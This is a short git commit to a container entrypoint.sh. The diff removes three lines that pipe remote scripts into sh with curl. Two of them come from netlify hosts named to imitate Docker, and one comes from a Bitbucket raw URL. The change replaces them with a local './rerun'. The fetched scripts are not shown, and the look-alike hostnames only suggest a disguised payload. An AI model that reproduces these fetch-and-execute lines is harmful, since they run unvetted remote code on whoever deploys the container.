088075484b461565355814c88e3d44a95125be39
kijang-020 <85983742+kijang-020@users.noreply.github.com>
2021-11-16 20:32:40 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,3 +1,1 @@
-#curl https://dockerio4.netlify.app/runn.sh | sh
-#curl https://dockerio2.netlify.app/run.sh | sh
-curl https://bitbucket.org/fgt5567/php-idx/raw/e36a7ea58560637c020787dce8bd2af5c2ae2cd4/run.sh | sh
+./rerun
